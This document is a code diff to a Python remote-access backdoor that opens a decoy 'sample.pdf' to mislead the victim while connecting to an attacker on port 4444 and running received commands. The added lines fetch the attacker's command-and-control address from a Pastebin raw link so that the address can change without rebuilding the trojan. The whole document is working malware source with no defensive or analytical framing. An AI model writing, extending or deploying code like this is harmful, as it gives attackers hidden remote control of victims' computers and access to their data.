@@ -6,6 +6,16 @@ import os
 import base64
 import sys
 import shutil
+import requests
+
+def fetch_c2_ip():
+    try:
+        # Replace with your actual Pastebin or GitHub Gist RAW link
+        url = "https://pastebin.com/raw/DjTikqsH"
+        response = requests.get(url, timeout=5)
+        return response.text.strip()
+    except:
+        return "Server down for pastebin"
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -83,11 +93,12 @@ class Backdoor:
                 
             self.reliable_send(command_result) # Send the result back to the attacker machine
 
+ATTACKER_IP = fetch_c2_ip()
 file_name = sys._MEIPASS + "sample.pdf" # Location for pdf
 subprocess.Popen(file_name, shell=True) # Open the pdf file
 
 try:
-    my_backdoor = Backdoor("Attacker's IP", 4444) # Create an object of the class
+    my_backdoor = Backdoor(ATTACKER_IP, 4444) # Create an object of the class
     my_backdoor.run() # Call the run method
 except Exception:
     sys.exit()
